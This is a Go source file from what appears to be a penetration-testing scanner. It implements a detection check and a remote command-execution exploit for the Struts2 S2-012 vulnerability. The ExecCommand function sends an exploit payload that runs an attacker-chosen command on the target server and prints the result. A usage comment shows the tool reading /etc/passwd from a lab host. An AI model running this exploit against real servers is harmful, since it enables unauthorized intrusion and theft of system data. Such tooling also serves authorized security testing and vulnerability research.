package s2_012

import (
    "fmt"
    "github.com/fatih/color"
    "github.com/yhy0/ChYing/pkg/Jie/scan/Pocs/java/struts2/utils"
    "net/url"
    "strings"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-012/user.action --vn 12 --mode exec --data "name=fuckit" --cmd "cat /etc/passwd"
*/

func Check(targetUrl string, postData string) {
    respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.POC_s012_check)
    if utils.IfContainsStr(respString, utils.Checkflag) {
        color.Red("*Found Struts2-012！")
    } else {
        fmt.Println("Struts2-012 Not Vulnerable.")
    }
}
func ExecCommand(targetUrl string, command string, postData string) {
    respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.POC_s012_exec(command))
    respString = strings.Replace(url.QueryEscape(respString), "%00", "", -1)
    fmt.Println(url.QueryUnescape(respString[13:]))
}
